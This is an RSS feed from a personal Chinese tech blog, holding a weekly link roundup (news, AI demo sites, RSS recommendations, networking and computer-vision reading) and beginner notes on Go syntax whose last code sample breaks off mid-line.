<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>R4y&#39;s Blog</title>
    <link>https://www.diglp.xyz/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Why join the navy, When you can be a PIRATE</description>
    <pubDate>Thu, 28 Mar 2019 02:16:51 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Weekly.1</title>
      <link>https://www.diglp.xyz/2019/03/28/Weekly_1/</link>
      <guid>https://www.diglp.xyz/2019/03/28/Weekly_1/</guid>
      <pubDate>Wed, 27 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;第二周了，谢谢谢谢，亲爱的小伙伴的友情鞭策。觉得大家看看前面的部分就好了，后面的
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>第二周了，谢谢谢谢，亲爱的小伙伴的友情鞭策。觉得大家看看前面的部分就好了，后面的 <strong>TECH</strong> 的部分，纯属个人来解决 <strong>浏览器标签爆炸的情况的</strong></p><p><strong>（遇到好文章来不及看，又舍不得关，越堆越多，最后在一次浏览器Carsh，或者一次意外关机中倒是解决了这混乱，觉得好轻松，也好可惜）</strong>。所以关标签得检查下来。</p><p>另外，把TECH放在最后，篇幅尽量–。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="新鲜事"><a href="#新鲜事" class="headerlink" title="新鲜事"></a>新鲜事</h3><ol><li><p>有政协委员曾建议大湾区设无需翻墙的互联网特区</p><blockquote><p> 在刚结束的中国人民政治协商会议上，有政协委员提案，建议在粤港澳大湾区建立互联网特区，开放浏览社交平台，无需“翻墙”，就可以浏览各地资讯。据港媒报道，全国政协香港区委员吴杰庄说，“相信香港和粤港澳大湾区建立的网际网路（互联网）特区，里面完全信息流动”。对于提案最终会否落实，吴杰庄说，问题应该不大，因为这是大势所趋，“国家都是会走向国际化，信息流在人流、物流、资金流当中，信息流是最重要”。    （《打喷嚏》）</p></blockquote></li><li><p>AI体验站 （这个其实算是冷饭，不过这里收集一下吧）</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly90aGlzcGVyc29uZG9lc25vdGV4aXN0LmNvbS8=" title="https://thispersondoesnotexist.com/">https://thispersondoesnotexist.com/<i class="fa fa-external-link"></i></span>    AI生成的人像照片，<strong>this person does not exist</strong></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGhpc3dhaWZ1ZG9lc25vdGV4aXN0Lm5ldC8=" title="https://www.thiswaifudoesnotexist.net/">https://www.thiswaifudoesnotexist.net/<i class="fa fa-external-link"></i></span>    AI生成的 <strong>Waifu</strong> 照片</li></ul></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubnZpZGlhLmNvbS9lbi11cy9yZXNlYXJjaC8=" title="https://www.nvidia.com/en-us/research/">Nvidia 研究院<i class="fa fa-external-link"></i></span>    这个也是上面的AI的延申，一样是AI的应用，更加黑科技</p><p>有钱就是厉害，比如这个 ，<span class="exturl" data-url="aHR0cHM6Ly93d3cubnZpZGlhLmNvbS9yZXNlYXJjaC9pbnBhaW50aW5nLw==" title="https://www.nvidia.com/research/inpainting/">全自动AI相片处理<i class="fa fa-external-link"></i></span> ，到什么程度呢？你你只需要把图片想修改的地方抹上 Mask ，Ai就会自动的帮你处理这里，这里写的是 <strong>修改 Modify</strong> ，包括去皱纹，去阻挡，去噪声，各种改变都OK</p><p><img src="https://www.nvidia.com/research/inpainting/static/media/header_1.fa124956.gif" alt=""></p><p><img src="https://www.nvidia.com/research/inpainting/static/media/header_2.d49f2d8d.gif" alt=""></p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubnZpZGlhLmNvbS9yZXNlYXJjaC9pbnBhaW50aW5nLw==" title="https://www.nvidia.com/research/inpainting/">https://www.nvidia.com/research/inpainting/<i class="fa fa-external-link"></i></span>)</li></ul></li><li><p>苹果卡 Apple Card</p><blockquote><p>A new kind of credit card. Created by Apple, not a bank.</p></blockquote><p>想上车的赶紧去 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYXBwbGUuY29tL2FwcGxlLWNhcmQv" title="https://www.apple.com/apple-card/">Subscribe<i class="fa fa-external-link"></i></span> 一波</p></li><li><p>树莓派出新啦，轻轻的没有声音，这次是 <code>Compute Model 3</code>简称 CM3，下面给出链接，以及一张惊艳的图</p><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9pdGVtLnRhb2Jhby5jb20vaXRlbS5odG0/aWQ9NDI1MDM5NTc5NzY=" title="https://item.taobao.com/item.htm?id=42503957976">https://item.taobao.com/item.htm?id=42503957976<i class="fa fa-external-link"></i></span></p></li><li><p>因为作者比较懒，所以很少有配图，这次不一样：</p><p><img src="https://i.loli.net/2019/03/27/5c9ae95566090.png" alt="CM3"></p></li></ul></li><li><p>国内某IT公司，销售用户交易信息到第三方，再次出现 公网弱密配置的 MongoDB</p></li><li><p>Google 发布游戏串流平台 Stadia</p><p>瘦主机和云计算，都是人们眼中的趋势。串流游戏的呼声也是很高呀。想想在床上的pad玩着5A游戏，岂不美哉。前端时间，刚刚和朋友谈起来，Nv 的串流平台。现在Google 开始变成通用平台了</p><p>不过，发布会的时候，<strong>就当场卡顿了（当场去世）</strong>，所以网络质量和带宽的需求玩家还是很担心，不然大作变成PPT 那不就爆炸？？？</p><hr><p>这个之前的《刺客信条：奥德赛》的时候，google已经做了类似的实验。不过，我们怕是万兆入户也估计玩不上这个了。</p></li><li><p>NPC精神：只跟主动跟自己说话的人说话</p><blockquote><p>NPC，也就是很多玩家所熟悉的游戏内系统角色，这些角色一般只在玩家点击后才会和你聊天，一般情况不会主动和别人搭讪。NPC精神指很多网友的生活态度和NPC一样，只要没人主动前来和自己说话，一般都保持沉默状态，属于被动型人格。但这种性格其实也有很多优点，如npc会指引玩家们很多任务提示、商品购买、玩法等系统层面的帮助。</p></blockquote></li><li><p>某大学大学的某演讲的某段</p><p>Yes, indeed. It is called College. Where the transitory(短暂的) lands of the exhausted students converge(集合). In venturing north, the pilgrims(朝圣者) discover the truth of the old words. The GPA fades, and the homework goes unsolved. When the link of graduation is threatened, the bell tolls, unearthing(发掘) the old lords of success from their graves. Wikipedia, saint(圣徒) of knowledge. Caffeine’s sleepless legion(极多), the one-nighters(一夜之间). And the reclusive(隐居的) lord of the drunk capital, Alcohol, the giant. Only in truth, the lords will barely do good, and the unhealthy will rise. Nameless accursed(受诅咒的) students, unfit even to be a functional part of society. And so it is that the student seeketh(寻找) jobs.﻿</p><hr></li></ol><ol><li><p>这条是最不重要的一条：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JveWNvdHQtZnVjay14dWV4aXFpYW5nZ3VvL0JveWNvdHQtRnVjay1YdWVYaVFpYW5nR3Vv" title="https://github.com/boycott-fuck-xuexiqiangguo/Boycott-Fuck-XueXiQiangGuo">针对使用Fuck-XueXiQiangGuo学习强国刷分软件作弊的人士的最后通牒！<i class="fa fa-external-link"></i></span> </p><p>软件开发者已经被带走，第一个因为开发刷课软件被带走的人，（嚯嚯嚯，小伙子你刷错课了）</p></li></ol><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoaW1vaHEvY2hpbmVzZS1wcm9ncmFtbWVyLXdyb25nLXByb251bmNpYXRpb24=" title="https://github.com/shimohq/chinese-programmer-wrong-pronunciation">chinese-programmer-wrong-pronunciation<i class="fa fa-external-link"></i></span>    很有意思的一个repo，程序员最容易发错音的单词</p><ul><li><p>app <span class="exturl" data-url="aHR0cDovL2RpY3QueW91ZGFvLmNvbS9kaWN0dm9pY2U/YXVkaW89YXBwJmFtcDt0eXBlPTE=" title="http://dict.youdao.com/dictvoice?audio=app&amp;type=1">🔊<i class="fa fa-external-link"></i></span> 里面的这个 <code>❌ [eipi&#39;pi]</code> 笑出声</p></li><li><p>很多常见单词不读读还不知道</p></li></ul></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Fpbmp4LzMwbWluX2d1aWRlcy9ibG9iL21hc3Rlci9wcm9tb3Rpb25fcnVsZS5tZA==" title="https://github.com/qinjx/30min_guides/blob/master/promotion_rule.md">零售行业优惠规则分析<i class="fa fa-external-link"></i></span>    优惠分析的一个较详细的收集，以后可以开开心心卖炒粉了</p><ul><li><p>满足优惠条件的动作</p></li><li><p>优惠条件作用对象</p></li><li><p>优惠方式</p></li><li><p>回馈内容</p></li><li><p>是否有限制</p></li></ul></li></ul><h3 id="PICKS"><a href="#PICKS" class="headerlink" title="PICKS"></a>PICKS</h3><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9mZWVkZXIuY28v" title="https://feeder.co/">Feeder——Follow everything you care about<i class="fa fa-external-link"></i></span> </p><p>现在深度依赖的一款应用，正如其标题说的：follow一切。</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwLw==" title="https://rsshub.app/">https://rsshub.app/<i class="fa fa-external-link"></i></span> </p><p>^== 这个是现在很好的的一个项目，这个项目里面汇集了各种各样的订阅源。（还有po*nsome的东西 XD）</p><p>这里推荐几个个人follow 的几个源。都是好东西</p></li></ul><table><thead><tr><th>RSS</th><th>Comment</th></tr></thead><tbody><tr><td><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL2RhcGVudGkvdHVndWE=" title="https://rsshub.app/dapenti/tugua">https://rsshub.app/dapenti/tugua<i class="fa fa-external-link"></i></span></td><td>一个<strong>中立态度</strong>的自媒体</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL3poaWh1L2hvdGxpc3Q=" title="https://rsshub.app/zhihu/hotlist">https://rsshub.app/zhihu/hotlist<i class="fa fa-external-link"></i></span></td><td>知乎热榜，看看热闹</td></tr><tr><td><strong><a href="http://www.diglp.xyz/atom.xml">http://www.diglp.xyz/atom.xml</a></strong></td><td><strong>现在的这个博客:crab:</strong></td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL2p1ZWppbi9jYXRlZ29yeS9mcm9udGVuZA==" title="https://rsshub.app/juejin/category/frontend">https://rsshub.app/juejin/category/frontend<i class="fa fa-external-link"></i></span></td><td>掘金前端</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL2dpdGh1Yi90cmVuZGluZy9kYWlseQ==" title="https://rsshub.app/github/trending/daily">https://rsshub.app/github/trending/daily/<i class="fa fa-external-link"></i></span></td><td>Github Daily Trending</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL216aXR1L2hvbWU=" title="https://rsshub.app/mzitu/home">https://rsshub.app/mzitu/home<i class="fa fa-external-link"></i></span></td><td>？？？</td></tr><tr><td>。。。</td><td>。。。</td></tr></tbody></table><ul><li><p>订阅自己喜欢的剧的方法</p><p>这里一个神站 <span class="exturl" data-url="aHR0cHM6Ly9lenR2LmlvLw==" title="https://eztv.io/">EZTV<i class="fa fa-external-link"></i></span> IMDB上的剧，基本同步的发布的。这里我们需要在 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW1kYi5jb20vdGl0bGUvdHQyNTc1OTg4Lz9yZWZfPW52X3NyXzI=" title="https://www.imdb.com/title/tt2575988/?ref_=nv_sr_2">IMDB<i class="fa fa-external-link"></i></span> 上找到我们的剧，之后使用上面的RSS就可以完成订阅了!</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwL2V6dHYvdG9ycmVudHMvMjU3NTk4OA==" title="https://rsshub.app/eztv/torrents/2575988">https://rsshub.app/eztv/torrents/2575988<i class="fa fa-external-link"></i></span></p></blockquote></li></ul><h3 id="TECH"><a href="#TECH" class="headerlink" title="TECH"></a>TECH</h3><ol><li><p><span class="exturl" data-url="aHR0cHM6Ly9mbGVzY2hpZXIuZ2l0aHViLmlvLzIwMTgvMTIvMjQvSW50ZXJuZXRfcHJvdG9jb2wv" title="https://fleschier.github.io/2018/12/24/Internet_protocol/">计算机网络-自底向上 – Fleschier 渐寒๑<i class="fa fa-external-link"></i></span>    一篇系统的讲网络的长篇大论</p><ul><li>网络之间可以通过路由器互连起来,因此互联网是 <em>网络的网络</em>.</li><li>以小写字母<code>i</code>开始的<code>internet(互连网)</code>是一个通用名词,泛指由多个计算机网络互连而成的计算机网络./以大写字母<code>I</code>开始到<code>Internet(互联网)</code>是一个专有名词,特指采用TCP/IP协议族作为通信规则的互联网.</li><li>虚电路/数据报</li><li>A{1,126},B{128,191},C{192,223}</li><li><code>IP地址 ::= {&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}</code> / <code>IP地址:={&lt;网络前缀&gt;,&lt;主机号&gt;}</code> CIDR</li></ul></li><li><p><span class="exturl" data-url="aHR0cDovL2xoLmNvbS9sdnMv" title="http://lh.com/lvs/">负载均衡集群 LVS 详解<i class="fa fa-external-link"></i></span>     很好的一篇讲 LVS 和LVS 组态的文章，后面深入学习</p><ul><li><strong>Scale-up</strong> 和 <strong>Scale out</strong></li><li><strong>LVS-NAT</strong>/<strong>LVS-DR</strong>/<strong>LVS-TUN</strong>/<strong>LVS-FULLNAT</strong></li></ul></li><li><p><span class="exturl" data-url="aHR0cDovL2VldmVlLmNjLzIwMTcvMDUvMTcvYnVpbGQtb3BlbmN2LW9uLWZpcmVmbHktcmszMzk5Lw==" title="http://eevee.cc/2017/05/17/build-opencv-on-firefly-rk3399/">在嵌入式设备上编译安装 OPENCV且启用 py接口<i class="fa fa-external-link"></i></span></p><p>一篇实用贴，针对的是对于一些特定的python 的版本其 <code>opencv-python</code> 的支持没有覆盖的情况，比如 <code>pyhthon3.5</code>。整体编译过程在 BCM2835 的 j4 情况下，一小时左右吧。</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly95cS5hbGl5dW4uY29tL2FydGljbGVzLzYzNjk3OQ==" title="https://yq.aliyun.com/articles/636979">探索 Python + HyperLPR 进行车牌识别<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83YWI2NzNhYmVhYWU=" title="https://www.jianshu.com/p/7ab673abeaae">探索 Python + HyperLPR 进行车牌识别<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pldXNlZXMvSHlwZXJMUFI=" title="https://github.com/zeusees/HyperLPR">基于深度学习高性能中文车牌识别 High Performance Chinese License Plate Recognition Framework.<i class="fa fa-external-link"></i></span> </p><p>很Nice 的一个车牌识别库，好用的车轮子</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9saW51eHRvb2xzLXJzdC5yZWFkdGhlZG9jcy5pby96aF9DTi9sYXRlc3QvaW5kZXguaHRtbCM=" title="https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#"> Linux Tools Quick Tutorial<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NoYW5lTWNDL2JlZXBz" title="https://github.com/ShaneMcC/beeps">https://github.com/ShaneMcC/beeps<i class="fa fa-external-link"></i></span>     使用主板Beep来做音乐，好玩</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2dsLmdpdGh1Yi5pby9wcmVzc3VyZS10ZXN0LXRvb2xzLw==" title="https://javasgl.github.io/pressure-test-tools/">压力测试工具ab、webbench、http_load、siege简单使用<i class="fa fa-external-link"></i></span> 常用的压测工具</p></li></ol><h3 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h3><ul><li>在宏观世界里，当群体人数众多的时候，同性相斥异性相吸的强相互作用力其效果将会明显的显现出来。（《玩世》）</li><li>现在，是过去的未来</li><li>NPC精神</li><li>分布式笔记系统，和毁灭型永续增长时间表 是日程混乱的开始</li><li>这里吐槽一下AppStore第一的软件，让我想到了 blackMirror 里面的，没记错的话 叫做急转直下。如果真的用评分来构建一个忠诚度社会的话，那么还有什么是真的呢。</li></ul><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>标签tab日趋收敛，🤞，THX，写了些自己觉得新奇好玩的内容，期待反馈~</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/28/Weekly_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>30 min for Golang</title>
      <link>https://www.diglp.xyz/2019/03/23/DEV_30min_for_Go/</link>
      <guid>https://www.diglp.xyz/2019/03/23/DEV_30min_for_Go/</guid>
      <pubDate>Fri, 22 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;想想自己说是学 &lt;code&gt;Go&lt;/code&gt; 已经想了了半年了都，可自己以前一直想的
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>想想自己说是学 <code>Go</code> 已经想了了半年了都，可自己以前一直想的 <strong>WeGene</strong> 一样。从有想法到付款，一下子晃了一年过去了。</p><p><strong>看着价钱从 299 到 499</strong> ,突然和进行看的《时间管理》书里面写到，<code>迟早都要做，晚做不如早做好</code> 。想想好像的确该认清点什么了。</p><hr><p>对了，这篇文章 全篇参考 </p><blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5ydW5vb2IuY29tL2dvL2dvLXR1dG9yaWFsLmh0bWw=" title="http://www.runoob.com/go/go-tutorial.html">Go语言教程 – RUNOOB<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="Go-简介"><a href="#Go-简介" class="headerlink" title="Go 简介"></a>Go 简介</h2><blockquote><p>先弄懂哪里使得他如此有魅力</p></blockquote><p>Go 自 2007 年开始研发，在2009 年开源。<br>Go 的语言的特色如下：</p><ul><li>简洁、快速、安全</li><li>并行、有趣、开源</li><li>内存管理、数组安全、编译迅速</li></ul><p>最大的亮点在于与身俱来的并发能力，用于服务端的开发。之前也有遇到很多的基于GO的项目：<code>frp，docker-compose，etc.</code> 。</p><hr><p>这里大量应用 《Go语言程序设计》这本书里的几句箴言（几大惊喜）</p><ol><li><p>大道至简的哲学    语言最小化</p></li><li><p>并行支持    </p></li><li><p>非侵入式接口    </p></li><li><p>极度简化但是完备的OOP</p></li><li><p>错误处理规范E</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f, err :- os.Open(file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="comment">//err</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br></pre></td></tr></table></figure></li><li><p>功能的内聚。</p></li><li><p>消除了堆和栈的边界</p></li><li><p>Go 对C的支持</p></li></ol><h2 id="Go-基础"><a href="#Go-基础" class="headerlink" title="Go 基础"></a>Go 基础</h2><h3 id="hello-world-开始"><a href="#hello-world-开始" class="headerlink" title="hello world 开始"></a>hello world 开始</h3><p>传统？Go 程序的基础组成由 <code>包声明，引入包，函数，变量，语句&amp;注释，注释</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">// 导入格式化输入的包</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">/*注释与C类似*/</span></span><br><span class="line">    fmt.Print(<span class="string">"test"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>Go 的精致的地方，在朋友当时吹吹这个用 首字母大大小写来区别函数的可见性的时候，就觉得不一般了。这里强制规定了：<strong>左花括号不能换行</strong>（消灭异端？？） 。</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><ul><li><p>左花括号不可换行</p></li><li><p>其实感觉吸取JS 的风格，不需要 <code>;</code> 如果同行多语句，需要使用 分号进行分隔。</p></li><li><p>注释风格同 C</p></li><li><p>标识符大小写敏感，同C，不可以数字开头，不可占用关键字，不可带运算符</p></li><li><p>关键字 ， （虽然不知道怎么用，先认识一些）</p><p>| -        | -           | -      | -         | -      |<br>| ——– | ———– | —— | ——— | —— |<br>| case     | defer       | go     | map       | struct |<br>| chan     | else        | goto   | package   | switch |<br>| const    | fallthrough | if     | range     | type   |<br>| continue | for         | import | return    | var    |<br>| break    | default     | func   | interface | select |</p></li><li><p>基本数据类型</p><p>布尔，数字，字符串，其他派生（指针，数组，结构体，Channel，函数，切片，接口，Map）</p><p>这里直接 合并了 C 里面常用的几个 <code>typedef</code> ：<code>uint8,int64,float64,complex128</code></p></li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li><p>类似与  JS 使用 var 关键字进行变量定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> &lt;identifer&gt; &lt;<span class="keyword">type</span>&gt;</span><br><span class="line"><span class="keyword">var</span> num1 <span class="keyword">int64</span></span><br><span class="line"><span class="keyword">var</span> num2 = <span class="number">123</span># 编译语言，自动确定类型</span><br><span class="line">num := <span class="number">123</span># 省略 <span class="keyword">var</span> 关键字， := 为声明语句</span><br></pre></td></tr></table></figure></li><li><p>多变量声明的方式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a,b,c := <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">a <span class="keyword">int8</span></span><br><span class="line">b <span class="keyword">int64</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>值类型和引用类型</p><p>这里结合 C 的思想，这里的变量是内存中的值。通过 <code>&amp;</code> 对变量进行取值。</p><p>但是，引类型是不一样的，这里理解为 指针吧，引用的值是保存其值的内存地址。</p></li><li><p>局部变量不允许声明但不使用，全局变量支持。</p></li><li><p>两个值进行交换 <code>a,b = b,a</code></p></li><li><p>空白标识符用于抛弃值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,_,c = <span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ul><li><p>同多数语言使用 <code>const</code> 标识符。</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a,c,d = <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    Unknown = <span class="number">0</span></span><br><span class="line">    Female = <span class="number">1</span></span><br><span class="line">    Male = <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p><code>iota</code> 这里不是 C 里面的 <code>int to ascii</code> ，可以理解为，编译器维护的一个全局的常量。<strong>iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const (</span><br><span class="line">    a = iota   //0</span><br><span class="line">    b          //1</span><br><span class="line">    c          //2</span><br><span class="line">    d = &quot;ha&quot;   //独立值，iota += 1</span><br><span class="line">    e          //&quot;ha&quot;   iota += 1</span><br><span class="line">    f = 100    //iota +=1</span><br><span class="line">    g          //100  iota +=1</span><br><span class="line">    h = iota   //7,恢复计数</span><br><span class="line">    i          //8</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li><p>基础的都支持 包括 ++ 和 – 。</p></li><li><p>关系运算符也是一样的。</p></li><li><p>逻辑运算也一样</p></li><li><p>位运算也一样 （^ 这个叫做脱字符），支持位移</p></li><li><p>复合运算符，较之于 C 有了拓展</p><p>= ， += ，-=， *= ，&lt;&lt;= …</p></li><li><p>取值，指向 &amp;*</p></li><li><p>优先级…记不住，用括号吧</p></li></ul><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><ul><li><p><code>if/if-else</code> , <code>switch</code>, <code>select</code>  多了个没有用过的， 下面给出基本格式</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">true</span> &#123;</span><br><span class="line">    fmt.Print(<span class="string">"123"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Print(<span class="string">"NO"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> val &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        fmt.Print(<span class="string">"123"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        fmt.Print(<span class="string">"123"</span>)</span><br><span class="line">    <span class="keyword">case</span> grade == <span class="string">"F"</span>:</span><br><span class="line">    fmt.Printf(<span class="string">"不及格\n"</span> )</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> communication clause  :</span><br><span class="line">       statement(s);      </span><br><span class="line">    <span class="keyword">case</span> communication clause  :</span><br><span class="line">       statement(s); </span><br><span class="line">    <span class="comment">/* 你可以定义任意数量的 case */</span></span><br><span class="line">    <span class="keyword">default</span> : <span class="comment">/* 可选 */</span></span><br><span class="line">       statement(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Type Switch 这个可以根据 类型来决定 Case，异常一样。<strong>不过很奇怪啊，是编译语言，类型还能变吗</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">switch x.(type)&#123;</span><br><span class="line">    case type:</span><br><span class="line">       statement(s);      </span><br><span class="line">    case type:</span><br><span class="line">       statement(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>fallthrough</code> 强制的执行下一个 Case 的内部代码，（感觉很大的提高了灵活性）</p></li><li><p>select 之前没有见过 不过看其解释如下：</p><blockquote><p>select是Go中的一个控制结构，类似于用于通信的switch语句。每个case必须是一个通信操作，要么是发送要么是接收。</p><p>select随机执行一个可运行的case。如果没有case可运行，它将阻塞，直到有case可运行。一个默认的子句应该总是可运行的。</p></blockquote><p>  <strong>这样就突然清楚了，LinuxC 里面的用于异步IO的 <code>select()</code> 在这里被表现为一个结构了，妙啊</strong></p><p>  关于这个结构的介绍，应该是和并发是息息相关的，现在看的有点蒙。先跳吧</p></li></ul><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><ul><li><p>缩减关键词，去掉了 while 使用for 实现 当和直到。形式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> init; condition; post &#123; &#125;<span class="comment">// 同 for(1;2;4) &#123;3&#125;</span></span><br><span class="line"><span class="keyword">for</span> condition &#123; &#125;<span class="comment">// 同 while(condition)&#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> &#123; &#125;<span class="comment">// 同 for(;;)&#123;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>使用 for 也可以很方便的对元素进行迭代</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span 